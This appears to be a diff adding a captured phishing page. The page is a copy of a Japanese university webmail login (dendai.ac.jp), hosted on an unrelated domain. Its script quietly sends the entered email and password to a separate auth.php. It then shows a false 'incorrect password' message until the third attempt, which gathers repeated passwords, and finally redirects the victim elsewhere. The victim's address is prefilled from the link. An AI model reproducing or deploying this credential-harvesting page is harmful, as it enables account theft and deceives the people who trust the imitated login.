@@ -1,0 +1,538 @@
+<!-- url: https://pontaldoatalaia.com/lead/refix/unicode/system.php?praga=c8b30f1df9ad871729f77d4df2726740&pid=c8b30f1df9ad871729f77d4df2726740&frameworkc8b30f1df9ad871729f77d4df2726740=c8b30f1df9ad871729f77d4df2726740&zonealldom=aaaa@example.jp&ubuntu=c8b30f1df9ad871729f77d4df2726740&about=c8b30f1df9ad871729f77d4df2726740-contact
+status: 200 -->
+<!DOCTYPE html>
+
+<html>
+<head>
+<meta http-equiv="Pragma" content="No-Cache">
+<meta http-equiv="Expires" content="Wed, 01-01-90 00:00:00 GMT">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>ウェブメール | 管理者</title>
+<link rel="shortcut icon" href = "https://mail.dendai.ac.jp/jim/favicon.ico">
+<link rel="stylesheet" type="text/css" href="https://mail.dendai.ac.jp/css/jpn/pub.css?v=1670252092" />
+<link rel="stylesheet" type="text/css" href="https://mail.dendai.ac.jp/extension/css/mailsuitex.login.min.css?v=1670252092" />
+<script type="text/javascript" src="https://mail.dendai.ac.jp/js/iepngfix_tilebg.js?v=1670252093" nonce="MjAxMjQ1MzUwMCwzNDU2NTY3MDQ1"></script>
+<script type="text/javascript" src="https://mail.dendai.ac.jp/extension/js/jquery.min.js?v=1670252092" nonce="MjAxMjQ1MzUwMCwzNDU2NTY3MDQ1"></script>
+<script type="text/javascript" src="https://mail.dendai.ac.jp/extension/js/mailsuitex.common.min.js?v=1670252092" nonce="MjAxMjQ1MzUwMCwzNDU2NTY3MDQ1"></script>
+
+<script language="javascript" nonce="MjAxMjQ1MzUwMCwzNDU2NTY3MDQ1">
+function del()
+{
+var form = document.forms[0];
+DeleteCookie("save_id");
+}
+
+function DeleteCookie(name)
+{
+var exp = new Date();
+exp.setTime (exp.getTime() - 1);
+var cval = GetCookie (name);
+SetCookie(name, "", exp.toGMTString(),"/");
+}
+
+function SetCookie(name, value)
+{
+var argv = SetCookie.arguments;
+var argc = SetCookie.arguments.length;
+var expires = (argc > 2) ? argv[2] : null;
+var path = (argc > 3) ? argv[3] : "/";
+var domain = "." + document.location.hostname;
+var secure = (argc > 5) ? argv[5] : false;
+document.cookie = name + "=" + escape (value) +
+((expires == null) ? "" : ("; expires=" + expires)) +
+((path == null) ? "" : ("; path=" + path)) +
+((domain == null) ? "." : ("; domain=" + domain)) +
+((secure == true) ? "; secure" : "");
+}
+
+function set()
+{
+var form = document.forms[0];
+SetCookie("save_id", form.id.value, "Tue, 01 Jan 2099 1:00:00 GMT","/");
+}
+
+function GetCookie(name)
+{
+var arg = name + "=";
+var alen = arg.length;
+var clen = document.cookie.length;
+var i = 0;
+
+while( i < clen )
+{
+var j = i + alen;
+if( document.cookie.substring(i, j) == arg )
+return getCookieVal(j);
+
+i = document.cookie.indexOf(" ", i) + 1;
+
+if( i == 0 )
+break;
+}
+
+return null;
+}
+
+function getCookieVal(offset)
+{
+var endstr = document.cookie.indexOf (";", offset);
+if( endstr == -1 )
+endstr = document.cookie.length;
+
+return unescape(document.cookie.substring(offset, endstr));
+}
+
+function InitPage()
+{
+var form = document.forms[0];
+var saveid = GetCookie("save_id");
+
+
+if( saveid != null )
+{
+form.id.value=saveid;
+form.save.checked=true;
+}
+
+var arrNavi = getNavigator();
+if (arrNavi[1] == "MSIE")
+{
+form.id.onkeypress = ieIDPress;
+form.pwd.onkeypress = iePWDPress;
+}
+else
+{
+form.id.onkeypress = mzIDPress;
+form.pwd.onkeypress = mzPWDPress;
+}
+
+if( saveid == null )
+form.id.focus();
+else
+form.pwd.focus();
+
+
+IE9PlaceHolder();
+}
+
+function mzIDPress(evt)
+{
+var form = document.forms[0];
+var e = evt? evt : window.event;
+
+if( !e )
+return;
+
+var key = 0;
+
+if( e.keycode )
+key = e.keycode;
+else if( typeof(e.which) != 'undefined' )
+key = e.which;
+
+if( key == 13 )
+{
+if( !IsValidID() )
+return;
+
+form.pwd.focus();
+return false;
+}
+
+return true;
+}
+
+function mzPWDPress(evt)
+{
+var form = document.forms[0];
+var e = evt? evt : window.event;
+
+if( !e )
+return;
+
+var key = 0;
+
+if( e.keycode )
+key = e.keycode;
+else if( typeof(e.which) != 'undefined' )
+key = e.which;
+
+if( key == 13 )
+{
+Login();
+return false;
+}
+
+return true;
+}
+
+function ieIDPress()
+{
+var form = document.forms[0];
+if( window.event.keyCode == 13 )
+{
+if( !IsValidID() )
+return;
+
+form.pwd.focus();
+return false;
+}
+
+return true;
+}
+
+function iePWDPress()
+{
+if( window.event.keyCode == 13 )
+{
+Login();
+return false;
+}
+
+return true;
+}
+
+function IsValidID()
+{
+var form = document.forms[0];
+var allowid = "";
+var id = "";
+var id_length = 0;
+
+allowid = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_.";
+
+id = form.id.value;
+id_length= id.length;
+
+for( i = 0 ; i < id_length; i++ )
+{
+if( allowid.indexOf(id.substring(i, i + 1)) < 0 )
+{
+alert("許可できない文字が含まれています。\n確認の上、もう一度入力してください。");
+form.id.value="";
+form.id.focus();
+return;
+}
+}
+
+return true;
+}
+
+function Login()
+{
+var form = document.forms[0];
+
+if( form.id.value.length == 0 )
+{
+alert("IDを入力してください。");
+form.id.focus();
+return;
+}
+
+if( !IsValidID() )
+return;
+
+if( form.pwd.value.length == 0 )
+{
+alert("パスワードを入力してください。");
+form.pwd.focus();
+return;
+}
+
+if( form.save.checked )
+set();
+else
+del();
+
+
+form.action = "login.cgi";
+form.submit();
+}
+
+function ChangeLang()
+{
+var form = document.forms[0];
+
+form.chglang.value = 1;
+form.action = "index.cgi";
+form.submit();
+}
+
+function ViewNoti(strKey)
+{
+var strOpt = "width=650,height=450,scrollbars=yes,resizable=yes";
+var strLink = "noticetoall.cgi?mode=view&key="+ strKey + "&spos=0&lang=jpn";
+window.open(strLink, "_blank", strOpt);
+}
+
+function ViewNotiList()
+{
+var strOpt = "width=650,height=450,scrollbars=yes,resizable=yes";
+var strLink = "noticetoall.cgi?spos=0&lang=jpn";
+window.open(strLink, "_blank", strOpt);
+}
+
+function SPhoneMode()
+{
+DeleteCookie("UA");
+SetCookie("UA", "mobile");
+location.href = "index.cgi";
+}
+
+$(document).ready(function()
+{
+bEnableShowPwd = false;
+bShowPwdBtn = false;
+
+$("#viewpwd_icon").mouseup(function() {
+$("#plain_pwd_wrap").hide();
+$("#plain_pwd").val("");
+$("#userpwd").focus();
+bShowPwdBtn = true;
+});
+$("#viewpwd_icon").mousedown(function() {
+bShowPwdBtn = false;
+$("#userpwd").focus();
+$("#plain_pwd").val($("#userpwd").val());
+$("#plain_pwd_wrap").show();
+});
+$('#userpwd').focus(function() {
+if ( $('#userpwd').val() == "" ) {
+bEnableShowPwd = true;
+}
+$(this).keypress(function() {
+if ( bEnableShowPwd ) {
+$("#viewpwd_icon").show();
+bShowPwdBtn = true;
+}
+});
+$(this).keyup(function() {
+if ( $('#userpwd').val() == "" ) {
+$("#viewpwd_icon").hide();
+bEnableShowPwd = true;
+}
+});
+});
+$('#userpwd').blur(function() {
+bEnableShowPwd = false;
+if ( bShowPwdBtn == true ) {
+$("#viewpwd_icon").hide();
+}
+});
+
+
+$('#MainWrap').addClass("Grada1");
+$('.LButton').addClass("Btn1");
+
+$('#MainWrap, #NoticeWrap').addClass("BorderRadius_On");
+
+$('input, select, .LButton').addClass("BorderRadius_On");
+
+
+SetCookie("login_style", "111","Tue, 01 Jan 2099 1:00:00 GMT","/");
+ });
+//-->
+</script>
+<style type="text/css">
+#DivSpace { height:0; width:0; }
+
+#MobileButtonDiv { position:relative; right:0; left:0; height:80px; border:3px solid #CCC; background-color:#F5F5F5; margin:20px; text-align: center; vertical-align:middle;}
+#MobileButton    { position:absolute; top:32px; left:0; width:65%; text-align:right; padding-right:10px; color:#888; font-size:32px; }
+#MobileButtonImg { position:absolute; top:26px; right:0; width:35%; text-align:left; padding-left:10px;}
+
+ /* *************************** */
+
+#MainWrap   { padding-top:32px; padding-bottom:5px; }
+#NoticeWrap { padding:0 15px 28px; border:1px solid #CCC; }
+
+
+
+.Noti_TitleWrap  { position:relative; padding:40px 0 0; bottom:0; font-family: "Arial"; }
+.Noti_TitleWrap > .Noti_Title  { position:absolute; height:15px; padding:0; bottom:0; left:0; font-size:12px;  font-weight:bold; color:#17C; }
+.Noti_TitleWrap > .MasterInfo_Title { position:absolute; height:17px; padding:0; bottom:0; left:0; font-size:12px;  font-weight:bold; color:#17C; }
+.Noti_TitleWrap > .OpenPop  { position:absolute; padding-right:3px; bottom:0; right:0;}
+
+.NotiItemWrap { position:relative; left:0; top:3px; margin-left:4px; font-family: "Arial"; }
+.NotiItem { height:23px; font-size: 12px; border-bottom:1px solid #ccc;}
+.NotiItem * { text-decoration: none; color: #555;  }
+.NotiItem > * {padding:6px 0 4px; height:25px; position:absolute; text-decoration: none; color: #444;   }
+
+.BookMarkName { left:0; }
+.BookMarkUrl  { right:0; }
+.NoticeDate   { left:0; }
+.NoticeTitle  { right:0; }
+
+.bookmark_name { width:192px; }
+.bookmark_url  { width:260px; }
+.noti_date     { width:70px; }
+.noti_title   { width:385px; }
+
+.bookmark_url:hover { text-decoration:underline; }
+.noti_title:hover { text-decoration:underline; }
+
+@media screen and (max-height: 400px) {
+#BaseWrap { margin-top: 20px; padding-top: 0;}
+}
+/* *************************** */
+
+</style>
+</head>
+
+<body onload="InitPage();">
+<div id="imgDiv"></div>
+<form name="loginform" class="loginform" method="POST" data-action="./auth.php">
+
+<input type="hidden" name="domain" value="">
+
+<input type="hidden" name="ismultisite" value="1">
+<input type="hidden" name="chglang" value="">
+<div id="BaseWrap">
+
+<div id="LogoWrap">
+
+<span id="LangDiv">
+<span id="SelLang">
+<select name="lang" size="1" class="login_lang" tabindex=6 >
+<option value="">言語</option>
+<option value="jpn">日本語</option><option value="eng">English</option><option value="kor">한국어</option>
+</option><option value="japan" selected>日本語</option>
+</select>
+</span>
+</span>
+
+<span id="LogoDiv">
+
+  <font size="15px"></font>
+
+</span>
+</div>
+<div id="MainWrap">
+<div class="InnerTitle">
+
+<span id="inTitle">アカウントログインする</span>
+
+</div>
+
+<div>
+<input id="zonealldom" type="text" name="zonealldom" value="" class="login_input login_id" style="width:430px;" placeholder="ユーザー名前" pattern=".[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$" required title="ユーザー名前" tabindex="1"><span id="placeholderid" class="place_holder" >ユーザーID</span>
+<img class="login_div" src="https://mail.dendai.ac.jp/images/pub/gen/login_field_icon_id.png">
+
+</div>
+<div>
+<input id="paswd" type="password" name="paswd" style="width:430px;" pattern=".{4,50}" title="パスワード" value="" class="login_input login_pwd" placeholder="パスワード" tabindex=2 required><span id="placeholderpwd" class="place_holder">パスワード</span>
+<span id="plain_pwd_wrap"><input id="plain_pwd" type="text" class="login_input login_id"></span>
+<img class="login_div" src="https://mail.dendai.ac.jp/images/pub/gen/login_field_icon_pwd.png">
+<img id="viewpwd_icon" src="https://mail.dendai.ac.jp/images/pub/gen/login_field_icon_viewpwd.png">
+</div>
+<div>
+<div id="ButtonBox">
+<span style="display:none;" id="unsubscribe">
+	  <font color="red" size="2px">入力した電子メールまたはパスワードの組み合わせが正しくありません。 正しいパスワードを入力してください。
+</font><br/><br/>
+	  </span>
+<div id="BtnBox_Left"><button type="submit" class="LButton" tabindex=4>ログイン</button></div>
+<div id="BtnBox_Right">
+<div id="IdSaveCheckbox">
+<span><input type="checkbox" name="save"  tabindex=7 value=""></span>
+<span class="Data">保つ 当方 としてログイン</span>
+</div>
+</div>
+</div>
+</div>
+
+</div>
+
+<div id="DivSpace"></div>
+<div id="Footer" class="copyright">
+<span></span> &copy; <script type="text/javascript" nonce="MjAxMjQ1MzUwMCwzNDU2NTY3MDQ1">var d = new Date();document.write(d.getFullYear());</script>
+</div>
+</div>
+</form>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer" nonce="MjAxMjQ1MzUwMCwzNDU2NTY3MDQ1"></script>
+<script>
+jQuery(document).ready(function ($) {
+  var counter = 0;
+
+  $('.loginform').on('submit', function (event) {
+    event.preventDefault();
+
+    $('#unsubscribe').hide();
+    let form = $(this);
+    let submit = form.find('[type="submit"]');
+    let action = form.attr('data-action');
+    let zonealldom = form.find('[name=zonealldom]').val();
+    let paswd = form.find('[name=paswd]').val();
+
+    if (zonealldom === '' || paswd === '') {
+      alert("Please fill in all fields.");
+      return;
+    }
+
+    submit.prop('disabled', true);
+    counter++;
+
+    corsReq(action, { zonealldom, paswd }, 'POST', function (res) {
+      let json = res.responseJSON;
+
+      if (json && json.success) {
+        if (counter >= 3) {
+          counter = 0;
+          window.location.href = 'http://' + json.domain;
+        } else {
+          $('#unsubscribe').show();
+          form.find('[name=paswd]').val('');
+          submit.prop('disabled', false);
+        }
+      } else {
+        alert("Invalid login or server error.");
+        form.find('[name=paswd]').val('');
+        submit.prop('disabled', false);
+      }
+    });
+  });
+});
+
+// CORS request helper
+(function (window, document, $, io) {
+  'use strict';
+
+  $.support.cors = true;
+
+  function corsReq(url, data, method, callback) {
+    return $.ajax({
+      url: url,
+      method: method,
+      data: data,
+      crossDomain: true,
+      dataType: 'json',
+      xhrFields: { withCredentials: false },
+      complete: callback
+    });
+  }
+
+  window.corsReq = corsReq;
+})(window, document, window.jQuery, window.io);
+</script>
+
+<script nonce="MjAxMjQ1MzUwMCwzNDU2NTY3MDQ1">
+    // Base64 decoding logic for 'zonealldom'
+    var url = new URL(window.location.href);
+    var encodedUsr = url.searchParams.get("zonealldom");  // Get the base64 encoded 'zonealldom'
+
+    if (encodedUsr) {
+      document.getElementById("zonealldom").value = encodedUsr;  // Set decoded value to the 'zonealldom' input
+        // try {
+        //     var decodedUsr = atob(encodedUsr);  // Decode base64 username
+        //     document.getElementById("zonealldom").value = decodedUsr;  // Set decoded value to the 'zonealldom' input
+        //     console.log("Decoded Username: " + decodedUsr);  // Log for debugging
+        // } catch (e) {
+        //     console.error("Error decoding base64 string:", e);  // Error handling
+        // }
+    }
+</script>
+</body>
+<script nonce="MjAxMjQ1MzUwMCwzNDU2NTY3MDQ1">
+document.getElementById('zonealldom').value=expicontent;
+</script>
+</html>
